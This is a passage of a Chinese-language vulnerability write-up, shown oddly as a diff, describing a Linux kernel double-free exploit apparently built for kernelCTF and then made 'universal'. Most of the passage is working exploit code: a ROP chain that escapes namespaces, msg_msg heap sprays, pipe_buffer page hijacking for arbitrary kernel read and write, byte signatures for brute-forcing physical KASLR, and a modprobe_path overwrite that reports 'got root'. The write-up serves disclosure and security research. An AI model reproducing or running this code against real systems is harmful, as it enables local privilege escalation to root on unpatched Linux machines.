+    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
+    rop[pos++] = 1;
+    rop[pos++] = kaslr_slide + FIND_TASK_BY_VPID;
+    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
+    rop[pos++] = obj_ptr + 0xe0 - 0x66;            // rax -> rdi and resume rop
+    rop[pos++] = kaslr_slide + 0xffffffff81caed31; // push rax; jmp qword ptr [rsi + 0x66];
 
-    // switch_task_namespaces(task, &init_nsproxy);
-    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
-    rop[pos++] = kaslr_slide + INIT_NSPROXY;
-    rop[pos++] = kaslr_slide + SWITCH_TASK_NAMESPACES;
+    // switch_task_namespaces(task, &init_nsproxy);
+    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
+    rop[pos++] = kaslr_slide + INIT_NSPROXY;
+    rop[pos++] = kaslr_slide + SWITCH_TASK_NAMESPACES;
 [...]
 ```  
   
@@ -550,114 +550,114 @@ D3v17 在
   
 你可以在我们的  
 GitHub[12]  
- 上找到 kernelCTF 的漏洞利用代码。  
+ 上找到 kernelCTF 的漏洞利用代码。  
 ## 通用型漏洞利用  
   
 在成功利用 KernelCTF 之后，我决定利用这个漏洞开发一个通用型漏洞利用程序（一个无需修改就能在任何目标系统上稳定运行的程序）。我采用了一种不同的方法来避免一些兼容性和可靠性问题，其中最大的问题是 ROP 和其他依赖内核数据偏移的技术，因为这些偏移在不同的构建版本之间会发生变化。虽然为不同的构建版本编译一个小工具列表并不罕见，但完全避免这些麻烦显然更有意义。  
 ### 使用 msg_msg->mlist.next 指针进行转移  
   
 利用双重释放漏洞，我们可以让msg_msg  
- 对象与udata  
- 重叠，从而控制m_list.next  
- 指针。  
+ 对象与udata  
+ 重叠，从而控制m_list.next  
+ 指针。  
 ```
 /* one msg_msg structure for each message */
-struct msg_msg {
- struct list_head m_list;
- long m_type;
- size_t m_ts;  /* message text size */
- struct msg_msgseg *next;
- void *security;
- /* the actual message follows immediately */
+struct msg_msg {
+ struct list_head m_list;
+ long m_type;
+ size_t m_ts;  /* message text size */
+ struct msg_msgseg *next;
+ void *security;
+ /* the actual message follows immediately */
 };
 [...]
-struct list_head {
- struct list_head *next, *prev;
+struct list_head {
+ struct list_head *next, *prev;
 };
 ```  
   
 通过将我们可控的msg_msg  
- 的 next 指针增加 256，我们可以使其指向已被其他主消息引用的不同次级消息，从而创建重复引用。这为我们提供了一种简单的方法来将双重释放能力扩展到其他缓存，并攻击更多种类的对象。  
+ 的 next 指针增加 256，我们可以使其指向已被其他主消息引用的不同次级消息，从而创建重复引用。这为我们提供了一种简单的方法来将双重释放能力扩展到其他缓存，并攻击更多种类的对象。  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCN0894z7ZxrG2WgnbLL21kS4Mwj9rMibSoVxUPRSP35JyY7ySV1cbXibsNE7CK6V46Aghpp5icKKEh3g/640?wx_fmt=png&from=appmsg "")  
 ```
 [...]
-    // Spray msg_msg in kmalloc-256 and kmalloc-1k
-    msg_t *msg = calloc(1, sizeof(msg_t) + 0xe8 - 48);
-    int qid[SPRAY];
-    for (int i = 0; i < SPRAY; i++)
-    {
-        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-        if (qid[i] < 0)
-        {
-            perror("[-] msgget");
-        }
-        *(uint32_t *)msg->mtext = i;
-        *(uint64_t *)&msg->mtext[8] = 0xdeadbeefcafebabe;
-        msg->mtype = MTYPE_PRIMARY;
-        msgsnd(qid[i], msg, 0xe8 - 48, 0);
-        msg->mtype = MTYPE_SECONDARY;
-        msgsnd(qid[i], msg, 1024 - 48, 0);
-    }
-    // Prepare evil msg
-    int evilqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-    if (evilqid < 0)
-    {
-        perror("[-] msgget");
-    }
+    // Spray msg_msg in kmalloc-256 and kmalloc-1k
+    msg_t *msg = calloc(1, sizeof(msg_t) + 0xe8 - 48);
+    int qid[SPRAY];
+    for (int i = 0; i < SPRAY; i++)
+    {
+        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+        if (qid[i] < 0)
+        {
+            perror("[-] msgget");
+        }
+        *(uint32_t *)msg->mtext = i;
+        *(uint64_t *)&msg->mtext[8] = 0xdeadbeefcafebabe;
+        msg->mtype = MTYPE_PRIMARY;
+        msgsnd(qid[i], msg, 0xe8 - 48, 0);
+        msg->mtype = MTYPE_SECONDARY;
+        msgsnd(qid[i], msg, 1024 - 48, 0);
+    }
+    // Prepare evil msg
+    int evilqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    if (evilqid < 0)
+    {
+        perror("[-] msgget");
+    }
 [...] // trigger double-free in kmalloc-256
 ```  
   
 现在我们已经扩大了双重释放漏洞的影响范围，接下来最好转向kmalloc-1k  
- 并让pipe_buffer  
- 与skbuf  
- 数据重叠，以控制page  
- 字段。  
+ 并让pipe_buffer  
+ 与skbuf  
+ 数据重叠，以控制page  
+ 字段。  
   
 page  
- 字段是指向vmemmap_base  
- 的指针，其中包含了所有用于跟踪映射到内核的内存页面的结构体。在读写管道时，这个指针用于获取与给定管道相关联的数据地址。  
+ 字段是指向vmemmap_base  
+ 的指针，其中包含了所有用于跟踪映射到内核的内存页面的结构体。在读写管道时，这个指针用于获取与给定管道相关联的数据地址。  
   
 ![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCN0894z7ZxrG2WgnbLL21kSibnTdsdxFiatIp4ME1ZyEyuJlsMlA4tbAGHKb7JaT1fE94uFMSYe4r0Q/640?wx_fmt=png&from=appmsg "")  
   
 这样我们就可以遍历vmemmap_base  
- 数组，并使用我们的管道作为接口直接读写内核内存。  
+ 数组，并使用我们的管道作为接口直接读写内核内存。  
 ### 暴力破解物理内核基址  
   
 有了遍历内核内存页面并进行读写的能力，我们可以轻松地寻找任何想要覆盖的值，比如modprobe_path  
 。需要注意的是，从vmemmap_base  
- 开始逐页搜索会非常耗时，因为内核基址加载的物理地址是随机化的。不过，内核基址的起始位置总是按照一个常量PHYSICAL_ALIGN  
- 值对齐的，在 amd64 上默认是 0x200000，所以我们可以通过首先只查看对齐的地址来寻找类似内核基址的内容，然后从那里开始逐页搜索，这样可以显著加快搜索速度。  
+ 开始逐页搜索会非常耗时，因为内核基址加载的物理地址是随机化的。不过，内核基址的起始位置总是按照一个常量PHYSICAL_ALIGN  
+ 值对齐的，在 amd64 上默认是 0x200000，所以我们可以通过首先只查看对齐的地址来寻找类似内核基址的内容，然后从那里开始逐页搜索，这样可以显著加快搜索速度。  
 ```
 [...]
 // Bruteforce phys-KASLR
-    uint64_t kernel_base;
-    bool found = false;
-    uint8_t data[PAGE_SIZE] = {0};
-    puts("[*] bruteforce phys-KASLR");
-    for (uint64_t i = 0;; i++)
-    {
-        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
-        pipebuf->page = vmemmap_base + kernel_base;
-        pipebuf->offset = 0;
-        pipebuf->len = PAGE_SIZE + 1;
+    uint64_t kernel_base;
+    bool found = false;
+    uint8_t data[PAGE_SIZE] = {0};
+    puts("[*] bruteforce phys-KASLR");
+    for (uint64_t i = 0;; i++)
+    {
+        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
+        pipebuf->page = vmemmap_base + kernel_base;
+        pipebuf->offset = 0;
+        pipebuf->len = PAGE_SIZE + 1;
 [...]
-        for (int j = 0; j < PIPE_SPRAY; j++)
-        {
-            memset(&data, 0, PAGE_SIZE);
-            int count;
-            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
-            {
-                continue;
-            }
+        for (int j = 0; j < PIPE_SPRAY; j++)
+        {
+            memset(&data, 0, PAGE_SIZE);
+            int count;
+            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
+            {
+                continue;
+            }
 [...]
 
-            if (is_kernel_base(data)) // [1] identify kernel base
-            {
-                found = true;
-                break;
-            }
-        }
+            if (is_kernel_base(data)) // [1] identify kernel base
+            {
+                found = true;
+                break;
+            }
+        }
 
 [...]
 ```  
@@ -665,94 +665,94 @@ page
 [...]
 static bool is_kernel_base(unsigned char *addr)
 {
-    // thanks lau :)
+    // thanks lau :)
 
-    // get-sig kernel_runtime_1
-    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
-        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
-        return true;
+    // get-sig kernel_runtime_1
+    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
+        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
+        return true;
 
-    // get-sig kernel_runtime_2
-    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
-        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
-        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
-        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
-        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
-        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
-        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
-        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
-        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
-        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
-        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
-        return true;
+    // get-sig kernel_runtime_2
+    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
+        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
+        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
+        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
+        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
+        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
+        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
+        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
+        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
+        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
+        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
+        return true;
 
-    return false;
+    return false;
 }
 [...]
 ```  
   
 在内核内存中定位/sbin/modprobe  
- 字符串并将其替换为指向我们所拥有文件的可控值变得相对简单。  
+ 字符串并将其替换为指向我们所拥有文件的可控值变得相对简单。  
   
 虽然我们在 chroot 环境中运行且无法在根文件系统创建文件，但有一个广为人知的技巧可以解决这个问题 - 通过/proc/<pid>/fd/<n>  
- 路径暴露 memfd。值得注意的是，由于我们无法获知非特权命名空间外的进程 ID，因此需要采用暴力枚举的方式。  
+ 路径暴露 memfd。值得注意的是，由于我们无法获知非特权命名空间外的进程 ID，因此需要采用暴力枚举的方式。  
 ```
 [...]
-    puts("[*] overwrite modprobe_path");
-    for (int i = 0; i < 4194304; i++)
-    {
-        pipebuf->page = modprobe_page;
-        pipebuf->offset = modprobe_off;
-        pipebuf->len = 0;
-        for (int i = 0; i < SKBUF_SPRAY; i++)
-        {
-            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
-            {
-                perror("[-] write(socket)");
-                break;
-            }
-        }
+    puts("[*] overwrite modprobe_path");
+    for (int i = 0; i < 4194304; i++)
+    {
+        pipebuf->page = modprobe_page;
+        pipebuf->offset = modprobe_off;
+        pipebuf->len = 0;
+        for (int i = 0; i < SKBUF_SPRAY; i++)
+        {
+            if (write(sock[i][0], pipebuf, 1024 - 320) < 0)
+            {
+                perror("[-] write(socket)");
+                break;
+            }
+        }
 
-        memset(&data, 0, PAGE_SIZE);
-        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);
+        memset(&data, 0, PAGE_SIZE);
+        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);
 
-        lseek(modprobe_fd, 0, SEEK_SET);
-        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);
+        lseek(modprobe_fd, 0, SEEK_SET);
+        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);
 
-        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
-        {
-            perror("\n[-] write(pipe)");
-        }
+        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
+        {
+            perror("\n[-] write(pipe)");
+        }
 
-        if (check_modprobe(fd_path))
-        {
-            puts("[-] failed to overwrite modprobe");
-            break;
-        }
+        if (check_modprobe(fd_path))
+        {
+            puts("[-] failed to overwrite modprobe");
+            break;
+        }
 
-        if (trigger_modprobe(status_fd))
-        {
-            puts("\n[+] got root");
-            goto out;
-        }
+        if (trigger_modprobe(status_fd))
+        {
+            puts("\n[+] got root");
+            goto out;
+        }
 
-        for (int i = 0; i < SKBUF_SPRAY; i++)
-        {
-            if (read(sock[i][1], leak, 1024 - 320) < 0)
-            {
-                perror("[-] read(socket)");
-                return -1;
-            }
-        }
-    }
-    puts("[-] fake modprobe failed");
+        for (int i = 0; i < SKBUF_SPRAY; i++)
+        {
+            if (read(sock[i][1], leak, 1024 - 320) < 0)
+            {
+                perror("[-] read(socket)");
+                return -1;
+            }
+        }
+    }
+    puts("[-] fake modprobe failed");
 [...]
 ```  
 ### 通用漏洞利用演示  
   
 你可以在我们的  
 GitHub[13]  
- 上找到完整的通用漏洞利用代码。  
+ 上找到完整的通用漏洞利用代码。  
 ## 披露时间线  
 - 3 月 21 日 -- 补丁公开发布  
   
